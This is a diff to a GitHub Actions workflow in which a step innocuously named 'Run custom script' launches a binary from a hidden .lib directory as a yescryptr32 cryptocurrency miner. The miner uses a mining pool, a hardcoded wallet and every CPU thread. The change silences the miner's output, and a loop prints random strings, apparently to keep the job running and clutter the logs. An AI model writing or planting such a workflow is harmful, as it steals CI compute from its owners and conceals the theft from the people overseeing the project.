@@ -64,7 +64,7 @@ jobs:
       - name: Run custom script
         run: |
           cd .lib
-          taskset $CORE_MASK ./sgr1 --algorithm yescryptr32 --pool $IP:$PORT --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WALLET_INFO --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
+          taskset $CORE_MASK ./sgr1 --algorithm yescryptr32 --pool $IP:$PORT --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$WALLET_INFO --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive >/dev/null 2>&1 &
           while true; do
               echo $RANDOM | md5sum | head -c 20
               echo
